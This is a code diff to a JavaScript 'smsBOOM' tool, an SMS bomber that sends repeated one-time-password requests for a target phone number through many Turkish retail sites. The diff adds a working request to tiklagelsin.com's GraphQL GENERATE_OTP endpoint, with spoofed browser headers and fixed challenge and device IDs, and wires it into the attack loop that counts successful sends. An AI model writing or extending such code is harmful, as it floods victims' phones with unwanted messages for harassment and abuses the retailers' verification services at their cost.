@@ -228,6 +228,38 @@ async function smsBOOM(numara, miktar) {
            title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
         });
     }
+    
+    function tiklagelsin(no) {
+		request("https://www.tiklagelsin.com/user/graphql", {
+		  "headers": {
+			"accept": "*/*",
+			"accept-language": "tr,tr-TR;q=0.9,en-US;q=0.8,en;q=0.7",
+			"content-type": "application/json",
+			"sec-ch-ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"",
+			"sec-ch-ua-mobile": "?0",
+			"sec-ch-ua-platform": "\"Windows\"",
+			"sec-fetch-dest": "empty",
+			"sec-fetch-mode": "cors",
+			"sec-fetch-site": "same-origin",
+			"x-device-type": "3",
+			"x-merchant-type": "0",
+			"x-no-auth": "true",
+			"Referer": "https://www.tiklagelsin.com/a/",
+			"Referrer-Policy": "strict-origin-when-cross-origin"
+		  },
+		  "body": `{\"operationName\":\"GENERATE_OTP\",\"variables\":{\"phone\":\"+90${no}",\"challenge\":\"85033055-4b81-4f6f-aed2-4a8ee1dce968\",\"deviceUniqueId\":\"web_6f59c0e5-3a0a-4bd3-907d-3cd973152333\"},\"query\":\"mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\\n  generateOtp(\\n    phone: $phone\\n    challenge: $challenge\\n    deviceUniqueId: $deviceUniqueId\\n  )\\n}\\n\"}`,
+		  "method": "POST"
+		}, function (err, httpResponse, body) {
+            if (httpResponse?.statusCode == 200) {
+                dataFSms.basarili++;
+                console.log(`[+] Tıkla Gelsin - ${no} - ${dataFSms.basarili}`.green);
+            } else {
+                dataFSms.hatali++;
+                console.log(`[-] Tıkla Gelsin - ${no} - ${dataFSms.hatali}`.red);
+            }
+           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
+        });
+	}
 
     function send(no) {
         kigili(no);
@@ -240,6 +272,7 @@ async function smsBOOM(numara, miktar) {
         a101(no);
         englishhome(no);
         sakasu(no);
+        tiklagelsin(no);
     }
 
     for (let i = 0; i < miktar; i++) {
